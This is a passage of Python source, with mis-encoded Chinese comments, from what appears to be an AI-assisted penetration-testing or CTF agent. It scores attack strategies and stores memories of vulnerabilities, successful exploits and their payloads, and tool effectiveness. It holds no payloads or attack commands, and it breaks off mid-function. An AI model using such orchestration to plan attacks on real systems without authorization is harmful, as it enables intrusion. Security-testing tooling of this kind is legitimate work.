        # è€ƒè™‘ç›®æ ‡ç›¸ä¼¼æ€§è°ƒæ•´
        target_type = self._classify_target_type(session.target)
        type_modifier = self.target_type_patterns.get(target_type, {}).get(session.current_strategy, 1.0)

        return min(avg_success * type_modifier, 1.0)

    def _calculate_resource_efficiency(self, session: SessionContext) -> float:
        """è®¡ç®—èµ„æºæ•ˆç‡åˆ†æ•°"""
        if not session.conversation_history:
            return 0.5

        total_tools_used = sum(len(conv.get("tools_used", [])) for conv in session.conversation_history)
        discoveries_made = len(session.discovered_assets)

        if total_tools_used == 0:
            return 0.0

        efficiency = discoveries_made / total_tools_used
        return min(efficiency, 1.0)

    def _classify_target_type(self, target: str) -> str:
        """åˆ†ç±»ç›®æ ‡ç±»å‹"""
        if not target:
            return "unknown"

        target_lower = target.lower()

        if any(indicator in target_lower for indicator in ["http", "www", ".com", ".org"]):
            return "web_application"
        elif re.search(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', target):
            return "ip_address"
        elif any(indicator in target_lower for indicator in [".exe", ".bin"]):
            return "binary_file"
        elif "/" in target or ":" in target:
            return "complex_endpoint"
        else:
            return "unknown"

    def predict_optimal_strategy(self, session: SessionContext, user_intent: Dict[str, Any],
                                scan_results: Dict[str, Any] = None) -> Dict[str, Any]:
        """åŸºäºMLé¢„æµ‹æœ€ä¼˜ç­–ç•¥"""

        # ç‰¹å¾å‘é‡åŒ–
        feature_vector = self.vectorize_target_characteristics(session, scan_results)

        # è®¡ç®—æ¯ä¸ªç­–ç•¥çš„é€‚é…åˆ†æ•°
        strategy_scores = {}

        for strategy_name, weights in self.strategy_weights.items():
            base_score = self._calculate_base_strategy_score(strategy_name, feature_vector, weights)

            # å†å²æ€§èƒ½è°ƒæ•´
            historical_performance = self._get_historical_performance(strategy_name, session)

            # ä¸Šä¸‹æ–‡ç›¸ä¼¼æ€§è°ƒæ•´
            similarity_bonus = self._calculate_context_similarity(strategy_name, session)

            # å®æ—¶å­¦ä¹ è°ƒæ•´
            learning_adjustment = self._get_learning_adjustment(strategy_name, user_intent)

            final_score = (base_score * 0.4 +
                          historical_performance * 0.3 +
                          similarity_bonus * 0.2 +
                          learning_adjustment * 0.1)

            strategy_scores[strategy_name] = {
                "total_score": final_score,
                "base_score": base_score,
                "historical_performance": historical_performance,
                "similarity_bonus": similarity_bonus,
                "learning_adjustment": learning_adjustment,
                "confidence": self._calculate_confidence(final_score, strategy_name)
            }

        # æ’åºå¹¶è¿”å›æ¨è
        sorted_strategies = sorted(strategy_scores.items(), key=lambda x: x[1]["total_score"], reverse=True)

        return {
            "recommended_strategy": sorted_strategies[0][0] if sorted_strategies else "adaptive_multi",
            "confidence": sorted_strategies[0][1]["confidence"] if sorted_strategies else 0.5,
            "alternative_strategies": [
                {
                    "strategy": strategy,
                    "score": details["total_score"],
                    "confidence": details["confidence"],
                    "reasoning": self._generate_strategy_reasoning(strategy, details)
                }
                for strategy, details in sorted_strategies[1:4]
            ],
            "feature_analysis": {
                "primary_factors": self._identify_primary_factors(feature_vector),
                "risk_assessment": self._assess_risk_level(feature_vector),
                "resource_estimation": self._estimate_resource_requirements(sorted_strategies[0][0] if sorted_strategies else "adaptive_multi")
            }
        }

    def _calculate_base_strategy_score(self, strategy_name: str, features: List[float], weights: Dict[str, float]) -> float:
        """è®¡ç®—ç­–ç•¥åŸºç¡€åˆ†æ•°"""
        score = 0.0

        if strategy_name == "web_comprehensive":
            score = (features[0] * weights["port_diversity"] +  # WebæŒ‡æ ‡
                    features[6] * weights["service_versions"] +   # WebæœåŠ¡
                    features[11] * weights["response_time"] +     # å“åº”æ—¶é—´
                    features[9] * weights["vulnerability_history"])  # æ¼æ´æ•°é‡

        elif strategy_name == "ctf_quick_solve":
            score = (features[4] * weights["time_constraint"] +   # CTFæ¨¡å¼
                    features[16] * weights["flag_pattern_match"] +  # ç´§æ€¥ç¨‹åº¦
                    features[19] * weights["tool_efficiency"])      # èµ„æºæ•ˆç‡

        elif strategy_name == "network_recon":
            score = (features[1] * weights["network_size"] +      # IPç›®æ ‡
                    features[5] * weights["response_rate"] +       # ç«¯å£æ•°é‡
                    features[7] * weights["service_diversity"])    # ä¼ ç»ŸæœåŠ¡

        elif strategy_name == "pwn_exploitation":
            score = (features[17] * weights["binary_complexity"] +  # ç¯å¢ƒå¤æ‚åº¦
                    features[10] * weights["mitigation_presence"] +  # WAFæ£€æµ‹
                    features[18] * weights["exploit_availability"])  # æˆåŠŸæ¦‚ç‡

        elif strategy_name == "adaptive_multi":
            score = (features[17] * weights["environment_complexity"] +  # ç¯å¢ƒå¤æ‚åº¦
                    features[2] * weights["tool_synergy"] +              # å‘ç°èµ„äº§
                    features[15] * weights["discovery_rate"])            # å®Œæˆä»»åŠ¡

        return min(max(score, 0.0), 1.0)

    def _get_historical_performance(self, strategy_name: str, session: SessionContext) -> float:
        """è·å–å†å²æ€§èƒ½åˆ†æ•°"""
        target_type = self._classify_target_type(session.target)

        # è·å–ç­–ç•¥å†å²è®°å½•
        strategy_history = self.strategy_performance_history.get(strategy_name, [])

        if not strategy_history:
            return 0.5  # é»˜è®¤ä¸­ç­‰è¡¨ç°

        # è·å–ç›®æ ‡ç±»å‹ç‰¹å®šçš„è¡¨ç°
        type_specific = self.target_type_patterns.get(target_type, {}).get(strategy_name, [])

        if type_specific:
            recent_performance = sum(type_specific[-5:]) / len(type_specific[-5:])
        else:
            recent_performance = sum(strategy_history[-10:]) / len(strategy_history[-10:])

        return recent_performance

    def _calculate_context_similarity(self, strategy_name: str, session: SessionContext) -> float:
        """è®¡ç®—ä¸Šä¸‹æ–‡ç›¸ä¼¼æ€§å¥–åŠ±"""
        current_context = {
            "target_type": self._classify_target_type(session.target),
            "attack_mode": session.attack_mode,
            "session_depth": len(session.conversation_history),
            "discoveries": len(session.discovered_assets)
        }

        # æŸ¥æ‰¾ç›¸ä¼¼çš„å†å²ä¸Šä¸‹æ–‡
        similarity_scores = []

        for stored_context in self.target_vectors.values():
            if stored_context.get("successful_strategy") == strategy_name:
                similarity = self._calculate_context_cosine_similarity(current_context, stored_context)
                similarity_scores.append(similarity)

        if similarity_scores:
            return sum(similarity_scores) / len(similarity_scores)

        return 0.0

    def _calculate_context_cosine_similarity(self, ctx1: Dict, ctx2: Dict) -> float:
        """è®¡ç®—ä¸Šä¸‹æ–‡ä½™å¼¦ç›¸ä¼¼åº¦"""
        # ç®€åŒ–çš„ç›¸ä¼¼åº¦è®¡ç®—
        score = 0.0
        total_factors = 0

        if ctx1.get("target_type") == ctx2.get("target_type"):
            score += 0.4
        total_factors += 1

        if ctx1.get("attack_mode") == ctx2.get("attack_mode"):
            score += 0.3
        total_factors += 1

        # æ•°å€¼ç‰¹å¾çš„ç›¸ä¼¼åº¦
        depth_diff = abs(ctx1.get("session_depth", 0) - ctx2.get("session_depth", 0))
        depth_similarity = max(0, 1 - depth_diff / 20.0)
        score += depth_similarity * 0.3
        total_factors += 1

        return score / total_factors if total_factors > 0 else 0.0

    def _get_learning_adjustment(self, strategy_name: str, user_intent: Dict[str, Any]) -> float:
        """è·å–å®æ—¶å­¦ä¹ è°ƒæ•´åˆ†æ•°"""
        adjustment = 0.0

        # åŸºäºç”¨æˆ·æ„å›¾è°ƒæ•´
        intent = user_intent.get("primary_intent", "")
        urgency = user_intent.get("urgency_level", "normal")

        if intent == "security_testing" and strategy_name in ["web_comprehensive", "network_recon"]:
            adjustment += 0.2
        elif intent == "ctf_solving" and strategy_name == "ctf_quick_solve":
            adjustment += 0.3
        elif intent == "exploitation" and strategy_name in ["pwn_exploitation", "adaptive_multi"]:
            adjustment += 0.25

        # åŸºäºç´§æ€¥ç¨‹åº¦è°ƒæ•´
        if urgency == "high" and strategy_name in ["ctf_quick_solve", "network_recon"]:
            adjustment += 0.15
        elif urgency == "low" and strategy_name in ["web_comprehensive", "adaptive_multi"]:
            adjustment += 0.1

        return min(adjustment, 0.5)

    def _calculate_confidence(self, score: float, strategy_name: str) -> float:
        """è®¡ç®—æ¨èç½®ä¿¡åº¦"""
        base_confidence = score

        # åŸºäºå†å²æ•°æ®é‡è°ƒæ•´ç½®ä¿¡åº¦
        history_count = len(self.strategy_performance_history.get(strategy_name, []))
        history_bonus = min(history_count / 50.0, 0.2)  # æœ€å¤š20%å¥–åŠ±

        # åŸºäºç­–ç•¥å¤æ‚åº¦è°ƒæ•´
        complexity_penalty = {
            "ctf_quick_solve": 0.0,
            "network_recon": 0.05,
            "web_comprehensive": 0.1,
            "pwn_exploitation": 0.15,
            "adaptive_multi": 0.2
        }.get(strategy_name, 0.1)

        final_confidence = base_confidence + history_bonus - complexity_penalty
        return max(min(final_confidence, 1.0), 0.0)

    def _generate_strategy_reasoning(self, strategy_name: str, details: Dict[str, Any]) -> str:
        """ç”Ÿæˆç­–ç•¥æ¨èç†ç”±"""
        reasoning_parts = []

        if details["base_score"] > 0.7:
            reasoning_parts.append("ç›®æ ‡ç‰¹å¾é«˜åº¦åŒ¹é…")

        if details["historical_performance"] > 0.6:
            reasoning_parts.append("å†å²è¡¨ç°ä¼˜ç§€")

        if details["similarity_bonus"] > 0.3:
            reasoning_parts.append("å‘ç°ç›¸ä¼¼æˆåŠŸæ¡ˆä¾‹")

        if details["learning_adjustment"] > 0.2:
            reasoning_parts.append("ç”¨æˆ·æ„å›¾é«˜åº¦åŒ¹é…")

        if not reasoning_parts:
            reasoning_parts.append("åŸºäºå½“å‰ä¸Šä¸‹æ–‡çš„ç»¼åˆåˆ†æ")

        return ", ".join(reasoning_parts)

    def _identify_primary_factors(self, features: List[float]) -> List[str]:
        """è¯†åˆ«ä¸»è¦å½±å“å› ç´ """
        factors = []

        if features[0] > 0.5:  # WebæŒ‡æ ‡
            factors.append("Webåº”ç”¨ç‰¹å¾æ˜¾è‘—")
        if features[1] > 0.5:  # IPç›®æ ‡
            factors.append("ç½‘ç»œç›®æ ‡æ£€æµ‹")
        if features[5] > 0.3:  # ç«¯å£æ•°é‡
            factors.append("å¤šç«¯å£å¼€æ”¾")
        if features[9] > 0.2:  # æ¼æ´æ•°é‡
            factors.append("å·²çŸ¥æ¼æ´å­˜åœ¨")
        if features[17] > 0.6:  # ç¯å¢ƒå¤æ‚åº¦
            factors.append("å¤æ‚ç¯å¢ƒç»“æ„")

        return factors[:3]  # è¿”å›å‰3ä¸ªä¸»è¦å› ç´ 

    def _assess_risk_level(self, features: List[float]) -> str:
        """è¯„ä¼°é£é™©ç­‰çº§"""
        risk_score = 0.0

        # WAFæ£€æµ‹
        if features[10] > 0.5:
            risk_score += 0.3

        # SSLå¯ç”¨
        if features[12] > 0.5:
            risk_score += 0.2

        # ç¯å¢ƒå¤æ‚åº¦
        risk_score += features[17] * 0.3

        # å“åº”æ—¶é—´ï¼ˆå¯èƒ½è¡¨ç¤ºç›‘æ§ï¼‰
        if features[11] > 0.5:
            risk_score += 0.2

        if risk_score < 0.3:
            return "ä½é£é™©"
        elif risk_score < 0.6:
            return "ä¸­ç­‰é£é™©"
        else:
            return "é«˜é£é™©"

    def _estimate_resource_requirements(self, strategy_name: str) -> Dict[str, Any]:
        """ä¼°ç®—èµ„æºéœ€æ±‚"""
        requirements = {
            "ctf_quick_solve": {
                "estimated_time": "5-15åˆ†é’Ÿ",
                "cpu_intensity": "ä½",
                "bandwidth_usage": "ä½",
                "tool_count": "3-5ä¸ª"
            },
            "network_recon": {
                "estimated_time": "15-30åˆ†é’Ÿ",
                "cpu_intensity": "ä¸­",
                "bandwidth_usage": "ä¸­",
                "tool_count": "4-7ä¸ª"
            },
            "web_comprehensive": {
                "estimated_time": "30-60åˆ†é’Ÿ",
                "cpu_intensity": "é«˜",
                "bandwidth_usage": "é«˜",
                "tool_count": "6-10ä¸ª"
            },
            "pwn_exploitation": {
                "estimated_time": "20-45åˆ†é’Ÿ",
                "cpu_intensity": "é«˜",
                "bandwidth_usage": "ä½",
                "tool_count": "4-8ä¸ª"
            },
            "adaptive_multi": {
                "estimated_time": "45-90åˆ†é’Ÿ",
                "cpu_intensity": "å¾ˆé«˜",
                "bandwidth_usage": "é«˜",
                "tool_count": "8-15ä¸ª"
            }
        }

        return requirements.get(strategy_name, requirements["adaptive_multi"])

    def update_strategy_performance(self, strategy_name: str, success_rate: float,
                                  target_type: str = None, context: Dict[str, Any] = None):
        """æ›´æ–°ç­–ç•¥æ€§èƒ½è®°å½•"""

        # æ›´æ–°å…¨å±€æ€§èƒ½å†å²
        if strategy_name not in self.strategy_performance_history:
            self.strategy_performance_history[strategy_name] = []

        self.strategy_performance_history[strategy_name].append(success_rate)

        # ä¿æŒå†å²è®°å½•åœ¨åˆç†èŒƒå›´å†…
        if len(self.strategy_performance_history[strategy_name]) > 100:
            self.strategy_performance_history[strategy_name] = \
                self.strategy_performance_history[strategy_name][-100:]

        # æ›´æ–°ç›®æ ‡ç±»å‹ç‰¹å®šçš„æ€§èƒ½
        if target_type:
            if target_type not in self.target_type_patterns:
                self.target_type_patterns[target_type] = {}

            if strategy_name not in self.target_type_patterns[target_type]:
                self.target_type_patterns[target_type][strategy_name] = []

            self.target_type_patterns[target_type][strategy_name].append(success_rate)

            # ä¿æŒè®°å½•åœ¨åˆç†èŒƒå›´å†…
            if len(self.target_type_patterns[target_type][strategy_name]) > 50:
                self.target_type_patterns[target_type][strategy_name] = \
                    self.target_type_patterns[target_type][strategy_name][-50:]

        # å­˜å‚¨ä¸Šä¸‹æ–‡å‘é‡ç”¨äºç›¸ä¼¼æ€§åŒ¹é…
        if context:
            context_id = f"{strategy_name}_{int(time.time())}"
            self.target_vectors[context_id] = {
                **context,
                "successful_strategy": strategy_name,
                "success_rate": success_rate,
                "timestamp": datetime.now().isoformat()
            }

        # åº”ç”¨å¼ºåŒ–å­¦ä¹ æ›´æ–°æƒé‡
        self._update_strategy_weights(strategy_name, success_rate, target_type)

    def _update_strategy_weights(self, strategy_name: str, success_rate: float, target_type: str = None):
        """ä½¿ç”¨å¼ºåŒ–å­¦ä¹ æ›´æ–°ç­–ç•¥æƒé‡"""
        if strategy_name not in self.strategy_weights:
            return

        # è®¡ç®—å¥–åŠ±ä¿¡å·
        reward = (success_rate - 0.5) * 2  # å°†0-1è½¬æ¢ä¸º-1åˆ°1çš„å¥–åŠ±

        # ä½¿ç”¨ç®€å•çš„æ¢¯åº¦ä¸Šå‡æ›´æ–°æƒé‡
        for factor, current_weight in self.strategy_weights[strategy_name].items():
            adjustment = self.learning_rate * reward * current_weight
            new_weight = current_weight + adjustment

            # ä¿æŒæƒé‡åœ¨åˆç†èŒƒå›´å†…
            self.strategy_weights[strategy_name][factor] = max(0.1, min(new_weight, 0.9))

        # é‡æ–°æ ‡å‡†åŒ–æƒé‡
        total_weight = sum(self.strategy_weights[strategy_name].values())
        for factor in self.strategy_weights[strategy_name]:
            self.strategy_weights[strategy_name][factor] /= total_weight

    def get_performance_analytics(self) -> Dict[str, Any]:
        """è·å–æ€§èƒ½åˆ†ææŠ¥å‘Š"""
        analytics = {
            "strategy_performance_overview": {},
            "target_type_insights": {},
            "learning_progress": {},
            "optimization_recommendations": []
        }

        # ç­–ç•¥æ€§èƒ½æ¦‚è§ˆ
        for strategy, history in self.strategy_performance_history.items():
            if history:
                analytics["strategy_performance_overview"][strategy] = {
                    "average_success_rate": sum(history) / len(history),
                    "recent_trend": sum(history[-10:]) / len(history[-10:]) if len(history) >= 10 else sum(history) / len(history),
                    "total_executions": len(history),
                    "best_performance": max(history),
                    "worst_performance": min(history),
                    "stability": 1.0 - (max(history) - min(history))  # ç¨³å®šæ€§æŒ‡æ ‡
                }

        # ç›®æ ‡ç±»å‹æ´å¯Ÿ
        for target_type, strategies in self.target_type_patterns.items():
            analytics["target_type_insights"][target_type] = {
                "best_strategy": max(strategies.items(), key=lambda x: sum(x[1]) / len(x[1]))[0] if strategies else None,
                "strategy_effectiveness": {
                    strategy: sum(performance) / len(performance)
                    for strategy, performance in strategies.items()
                }
            }

        # å­¦ä¹ è¿›å±•
        total_sessions = sum(len(history) for history in self.strategy_performance_history.values())
        analytics["learning_progress"] = {
            "total_learning_sessions": total_sessions,
            "strategies_learned": len(self.strategy_performance_history),
            "target_types_analyzed": len(self.target_type_patterns),
            "confidence_improvement": self._calculate_confidence_improvement()
        }

        # ä¼˜åŒ–å»ºè®®
        analytics["optimization_recommendations"] = self._generate_optimization_recommendations()

        return analytics

    def _calculate_confidence_improvement(self) -> float:
        """è®¡ç®—ç½®ä¿¡åº¦æ”¹è¿›ç¨‹åº¦"""
        if not self.strategy_performance_history:
            return 0.0

        improvements = []
        for strategy, history in self.strategy_performance_history.items():
            if len(history) >= 10:
                early_avg = sum(history[:5]) / 5
                recent_avg = sum(history[-5:]) / 5
                improvement = recent_avg - early_avg
                improvements.append(improvement)

        return sum(improvements) / len(improvements) if improvements else 0.0

    def _generate_optimization_recommendations(self) -> List[Dict[str, str]]:
        """ç”Ÿæˆä¼˜åŒ–å»ºè®®"""
        recommendations = []

        # åˆ†æç­–ç•¥æ€§èƒ½
        for strategy, history in self.strategy_performance_history.items():
            if history:
                avg_performance = sum(history) / len(history)
                if avg_performance < 0.4:
                    recommendations.append({
                        "type": "strategy_improvement",
                        "strategy": strategy,
                        "recommendation": f"{strategy}ç­–ç•¥è¡¨ç°è¾ƒå·®ï¼Œå»ºè®®è°ƒæ•´æƒé‡æˆ–å¢åŠ è®­ç»ƒæ•°æ®",
                        "priority": "high"
                    })
                elif avg_performance > 0.8:
                    recommendations.append({
                        "type": "strategy_expansion",
                        "strategy": strategy,
                        "recommendation": f"{strategy}ç­–ç•¥è¡¨ç°ä¼˜ç§€ï¼Œå»ºè®®æ‰©å±•åˆ°æ›´å¤šåœºæ™¯",
                        "priority": "medium"
                    })

        # æ•°æ®ä¸è¶³è­¦å‘Š
        low_data_strategies = [s for s, h in self.strategy_performance_history.items() if len(h) < 10]
        if low_data_strategies:
            recommendations.append({
                "type": "data_collection",
                "strategies": low_data_strategies,
                "recommendation": "éƒ¨åˆ†ç­–ç•¥ç¼ºä¹è¶³å¤Ÿçš„è®­ç»ƒæ•°æ®ï¼Œå»ºè®®å¢åŠ æµ‹è¯•é¢‘ç‡",
                "priority": "medium"
            })

        return recommendations

# å…¨å±€MLç­–ç•¥ä¼˜åŒ–å™¨å®ä¾‹
ml_strategy_optimizer = MLStrategyOptimizer()

# ==================== é«˜çº§å†…å­˜æŒä¹…åŒ–ç³»ç»Ÿ ====================

class AdvancedMemoryPersistence:
    """é«˜çº§å†…å­˜æŒä¹…åŒ–ç³»ç»Ÿ - ä½¿ç”¨å‘é‡å­˜å‚¨å®ç°é•¿æœŸè®°å¿†"""

    def __init__(self):
        self.vector_storage = {}  # ä¸»å‘é‡å­˜å‚¨
        self.memory_clusters = {}  # å†…å­˜èšç±»
        self.session_embeddings = {}  # ä¼šè¯åµŒå…¥
        self.knowledge_graph = {}  # çŸ¥è¯†å›¾è°±

        # æŒä¹…åŒ–é…ç½®
        self.max_memory_entries = 10000
        self.similarity_threshold = 0.7
        self.cluster_update_frequency = 100  # æ¯100ä¸ªæ¡ç›®æ›´æ–°ä¸€æ¬¡èšç±»
        self.entry_counter = 0

        # è®°å¿†ç±»å‹æƒé‡
        self.memory_weights = {
            "vulnerability_discovery": 1.0,
            "successful_exploit": 0.9,
            "tool_effectiveness": 0.8,
            "target_characteristics": 0.7,
            "strategy_outcome": 0.6,
            "conversation_context": 0.5
        }

    def store_memory(self, memory_type: str, content: Dict[str, Any],
                    session_context: SessionContext = None) -> str:
        """å­˜å‚¨è®°å¿†åˆ°å‘é‡å­˜å‚¨ç³»ç»Ÿ"""

        memory_id = f"{memory_type}_{int(time.time())}_{random.randint(1000, 9999)}"

        # åˆ›å»ºè®°å¿†æ¡ç›®
        memory_entry = {
            "id": memory_id,
            "type": memory_type,
            "content": content,
            "timestamp": datetime.now().isoformat(),
            "session_id": session_context.session_id if session_context else None,
            "importance_score": self._calculate_importance(memory_type, content),
            "access_count": 0,
            "last_accessed": datetime.now().isoformat(),
            "decay_factor": 1.0
        }

        # ç”Ÿæˆå‘é‡åµŒå…¥
        embedding_vector = self._generate_embedding(memory_entry)
        memory_entry["embedding"] = embedding_vector

        # å­˜å‚¨åˆ°å‘é‡å­˜å‚¨
        self.vector_storage[memory_id] = memory_entry

        # æ›´æ–°çŸ¥è¯†å›¾è°±
        self._update_knowledge_graph(memory_entry, session_context)

        # æ£€æŸ¥æ˜¯å¦éœ€è¦èšç±»æ›´æ–°
        self.entry_counter += 1
        if self.entry_counter % self.cluster_update_frequency == 0:
            self._update_memory_clusters()

        # æ¸…ç†æ—§è®°å¿†ï¼ˆå¦‚æœè¶…è¿‡é™åˆ¶ï¼‰
        self._cleanup_old_memories()

        logger.info(f"Stored memory: {memory_id} (type: {memory_type})")
        return memory_id

    def retrieve_similar_memories(self, query_context: Dict[str, Any],
                                memory_types: List[str] = None,
                                limit: int = 10) -> List[Dict[str, Any]]:
        """æ£€ç´¢ç›¸ä¼¼è®°å¿†"""

        # ç”ŸæˆæŸ¥è¯¢å‘é‡
        query_vector = self._generate_query_embedding(query_context)

        # è®¡ç®—ç›¸ä¼¼åº¦åˆ†æ•°
        similarities = []

        for memory_id, memory_entry in self.vector_storage.items():
            # ç±»å‹è¿‡æ»¤
            if memory_types and memory_entry["type"] not in memory_types:
                continue

            # è®¡ç®—ä½™å¼¦ç›¸ä¼¼åº¦
            similarity = self._cosine_similarity(query_vector, memory_entry["embedding"])

            # åº”ç”¨æ—¶é—´è¡°å‡
            time_factor = self._calculate_time_decay(memory_entry["timestamp"])

            # åº”ç”¨é‡è¦æ€§æƒé‡
            importance_factor = memory_entry["importance_score"]

            # åº”ç”¨è®¿é—®é¢‘ç‡åŠ æƒ
            access_factor = min(1.0 + memory_entry["access_count"] * 0.1, 2.0)

            final_score = similarity * time_factor * importance_factor * access_factor

            if final_score >= self.similarity_threshold:
                similarities.append({
                    "memory_id": memory_id,
                    "memory": memory_entry,
                    "similarity_score": similarity,
                    "final_score": final_score
                })

        # æ’åºå¹¶è¿”å›å‰Nä¸ªç»“æœ
        similarities.sort(key=lambda x: x["final_score"], reverse=True)
        results = similarities[:limit]

        # æ›´æ–°è®¿é—®è®¡æ•°
        for result in results:
            memory_id = result["memory_id"]
            self.vector_storage[memory_id]["access_count"] += 1
            self.vector_storage[memory_id]["last_accessed"] = datetime.now().isoformat()

        return results

    def get_contextual_insights(self, session_context: SessionContext) -> Dict[str, Any]:
        """åŸºäºå½“å‰ä¸Šä¸‹æ–‡è·å–æ´å¯Ÿ"""

        insights = {
            "relevant_vulnerabilities": [],
            "successful_techniques": [],
            "similar_targets": [],
            "recommended_approaches": [],
            "risk_indicators": []
        }

        # æ„å»ºæŸ¥è¯¢ä¸Šä¸‹æ–‡
        query_context = {
            "target": session_context.target,
            "attack_mode": session_context.attack_mode,
            "discovered_assets": session_context.discovered_assets,
            "completed_tasks": session_context.completed_tasks
        }

        # æ£€ç´¢ç›¸å…³æ¼æ´è®°å¿†
        vuln_memories = self.retrieve_similar_memories(
            query_context,
            memory_types=["vulnerability_discovery"],
            limit=5
        )

        for memory in vuln_memories:
            insights["relevant_vulnerabilities"].append({
                "vulnerability": memory["memory"]["content"].get("vulnerability_type"),
                "target_similarity": memory["similarity_score"],
                "exploitation_success": memory["memory"]["content"].get("exploitation_success", False),
                "tools_used": memory["memory"]["content"].get("tools_used", [])
            })

        # æ£€ç´¢æˆåŠŸæŠ€æœ¯
        exploit_memories = self.retrieve_similar_memories(
            query_context,
            memory_types=["successful_exploit"],
            limit=5
        )

        for memory in exploit_memories:
            insights["successful_techniques"].append({
                "technique": memory["memory"]["content"].get("technique"),
                "success_rate": memory["memory"]["content"].get("success_rate", 0),
                "target_type": memory["memory"]["content"].get("target_type"),
                "payload": memory["memory"]["content"].get("payload")
            })

        # æ£€ç´¢ç›¸ä¼¼ç›®æ ‡
        target_memories = self.retrieve_similar_memories(
            query_context,
            memory_types=["target_characteristics"],
            limit=3
        )

        for memory in target_memories:
            insights["similar_targets"].append({
                "target": memory["memory"]["content"].get("target"),
                "characteristics": memory["memory"]["content"].get("characteristics"),
                "successful_strategies": memory["memory"]["content"].get("successful_strategies", []),
                "discovery_methods": memory["memory"]["content"].get("discovery_methods", [])
            })

        # ç”Ÿæˆæ¨èæ–¹æ³•
        insights["recommended_approaches"] = self._generate_contextual_recommendations(
            session_context, vuln_memories, exploit_memories
        )

        # è¯†åˆ«é£é™©æŒ‡æ ‡
        insights["risk_indicators"] = self._identify_risk_indicators(
            session_context, insights["relevant_vulnerabilities"]
        )

        return insights

    def store_vulnerability_discovery(self, vulnerability_info: Dict[str, Any],
                                   session_context: SessionContext) -> str:
        """å­˜å‚¨æ¼æ´å‘ç°è®°å¿†"""

        content = {
            "vulnerability_type": vulnerability_info.get("type"),
            "severity": vulnerability_info.get("severity"),
            "target": session_context.target,
            "discovery_method": vulnerability_info.get("discovery_method"),
            "tools_used": vulnerability_info.get("tools_used", []),
            "exploitation_success": vulnerability_info.get("exploited", False),
            "mitigation_present": vulnerability_info.get("mitigation_present", False),
            "target_characteristics": {
                "target_type": ml_strategy_optimizer._classify_target_type(session_context.target),
                "discovered_services": list(session_context.discovered_assets.keys()),
                "environment_complexity": len(session_context.discovered_assets)
            }
        }

        return self.store_memory("vulnerability_discovery", content, session_context)

    def store_successful_exploit(self, exploit_info: Dict[str, Any],
                               session_context: SessionContext) -> str:
        """å­˜å‚¨æˆåŠŸåˆ©ç”¨è®°å¿†"""

        content = {
            "technique": exploit_info.get("technique"),
            "payload": exploit_info.get("payload"),
            "success_rate": exploit_info.get("success_rate", 1.0),
            "target_type": ml_strategy_optimizer._classify_target_type(session_context.target),
            "preconditions": exploit_info.get("preconditions", []),
            "side_effects": exploit_info.get("side_effects", []),
            "tools_used": exploit_info.get("tools_used", []),
            "execution_time": exploit_info.get("execution_time"),
            "target_response": exploit_info.get("target_response")
        }

        return self.store_memory("successful_exploit", content, session_context)

    def store_tool_effectiveness(self, tool_name: str, effectiveness_data: Dict[str, Any],
                               session_context: SessionContext) -> str:
        """å­˜å‚¨å·¥å…·æœ‰æ•ˆæ€§è®°å¿†"""

        content = {
            "tool_name": tool_name,
            "effectiveness_score": effectiveness_data.get("score", 0.5),
            "execution_time": effectiveness_data.get("execution_time"),
            "resource_usage": effectiveness_data.get("resource_usage"),
            "success_indicators": effectiveness_data.get("success_indicators", []),
            "failure_reasons": effectiveness_data.get("failure_reasons", []),
            "target_characteristics": {
                "target": session_context.target,
                "target_type": ml_strategy_optimizer._classify_target_type(session_context.target),
                "complexity": len(session_context.discovered_assets)
            },
            "context_factors": effectiveness_data.get("context_factors", [])
        }

        return self.store_memory("tool_effectiveness", content, session_context)

    def _generate_embedding(self, memory_entry: Dict[str, Any]) -> List[float]:
        """ç”Ÿæˆè®°å¿†æ¡ç›®çš„å‘é‡åµŒå…¥"""

        # åˆå§‹åŒ–50ç»´åµŒå…¥å‘é‡
        embedding = [0.0] * 50

        content = memory_entry["content"]
        memory_type = memory_entry["type"]

        # åŸºç¡€ç‰¹å¾ (0-9)
        if "target" in content:
            target = content["target"].lower() if content["target"] else ""
            embedding[0] = 1.0 if "http" in target or "www" in target else 0.0  # WebæœåŠ¡
            embedding[1] = 1.0 if re.search(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', target) else 0.0  # IP
            embedding[2] = len(target) / 100.0  # ç›®æ ‡åç§°é•¿åº¦æ ‡å‡†åŒ–

        # è®°å¿†ç±»å‹ç¼–ç  (10-14)
        type_encoding = {
            "vulnerability_discovery": [1.0, 0.0, 0.0, 0.0, 0.0],
            "successful_exploit": [0.0, 1.0, 0.0, 0.0, 0.0],
            "tool_effectiveness": [0.0, 0.0, 1.0, 0.0, 0.0],
            "target_characteristics": [0.0, 0.0, 0.0, 1.0, 0.0],
            "strategy_outcome": [0.0, 0.0, 0.0, 0.0, 1.0]
        }
        type_vec = type_encoding.get(memory_type, [0.0, 0.0, 0.0, 0.0, 0.0])
        embedding[10:15] = type_vec

        # ä¸¥é‡æ€§/é‡è¦æ€§ç‰¹å¾ (15-17)
        if "severity" in content:
            severity_map = {"low": 0.2, "medium": 0.5, "high": 0.8, "critical": 1.0}
            embedding[15] = severity_map.get(content["severity"], 0.5)

        if "success_rate" in content:
            embedding[16] = content["success_rate"]

        embedding[17] = memory_entry["importance_score"]

        # å·¥å…·ç‰¹å¾ (18-27)
        if "tools_used" in content:
            tools = content["tools_used"]
            tool_features = {
                "nmap": 18, "gobuster": 19, "sqlmap": 20, "nuclei": 21, "nikto": 22,
                "metasploit": 23, "burp": 24, "wireshark": 25, "john": 26, "hashcat": 27
            }
            for tool in tools:
                for tool_name, index in tool_features.items():
                    if tool_name in tool.lower():
                        embedding[index] = 1.0

        # ç›®æ ‡ç‰¹å¾ (28-37)
        if "target_characteristics" in content:
            char = content["target_characteristics"]
            embedding[28] = char.get("environment_complexity", 0) / 20.0  # æ ‡å‡†åŒ–å¤æ‚åº¦

            # ç›®æ ‡ç±»å‹ç‰¹å¾
            target_type = char.get("target_type", "unknown")
            type_features = {
                "web_application": 29, "ip_address": 30, "binary_file": 31,
                "complex_endpoint": 32, "network_range": 33
            }
            if target_type in type_features:
                embedding[type_features[target_type]] = 1.0

        # æ—¶é—´ç‰¹å¾ (38-42)
        timestamp = datetime.fromisoformat(memory_entry["timestamp"])
        embedding[38] = timestamp.hour / 24.0  # å°æ—¶æ ‡å‡†åŒ–
        embedding[39] = timestamp.weekday() / 7.0  # æ˜ŸæœŸæ ‡å‡†åŒ–
        embedding[40] = timestamp.month / 12.0  # æœˆä»½æ ‡å‡†åŒ–

        # è®¿é—®æ¨¡å¼ç‰¹å¾ (43-47)
